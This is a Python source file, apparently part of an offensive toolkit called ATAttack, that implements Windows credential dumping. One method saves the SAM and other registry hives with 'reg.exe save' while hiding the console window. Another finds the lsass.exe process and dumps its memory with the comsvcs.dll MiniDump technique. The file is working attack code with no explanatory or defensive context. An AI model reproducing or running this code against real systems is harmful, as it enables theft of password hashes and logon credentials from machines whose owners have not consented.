#!/usr/bin/python
# coding=utf-8

from ATAttack.framework.constant import constant
import subprocess
import os
import re

try:
    import subprocess as sub
    STARTF_USESHOWWINDOW = sub.STARTF_USESHOWWINDOW
    SW_HIDE = sub.SW_HIDE
except ImportError:
    STARTF_USESHOWWINDOW = subprocess.STARTF_USESHOWWINDOW
    SW_HIDE = subprocess.SW_HIDE

class samdump:

    def __init__(self):
        pass

    def save_hives(self):
        """
        Save SAM Hives
        """
        sammhives = []
        try:
            for h in constant.hives:
                if not os.path.exists(constant.hives[h]):
                    cmdline = r'reg.exe save hklm\{} {}'.format(h, constant.hives[h])
                    info = subprocess.STARTUPINFO()
                    info.dwFlags = STARTF_USESHOWWINDOW
                    info.wShowWindow = SW_HIDE
                    p = subprocess.Popen(
                        cmdline,
                        startupinfo=info,
                        stdin=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        stdout=subprocess.PIPE,
                        universal_newlines=True)
                    results, _ = p.communicate()
                    sammhives.append(constant.hives[h])
            sam=sammhives
            return sam
        except BaseException as e:  # Catch all kind of exceptions
            return e

    def lsassdump(self):

        tasklist = os.popen('tasklist /svc | findstr lsass.exe').read()
        regex = re.findall(r'\d+', tasklist, re.S)
        payload = r'powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump {} {} full"'.format(
            regex[0], constant.dump_name)
        os.popen(payload)
        return constant.dump_name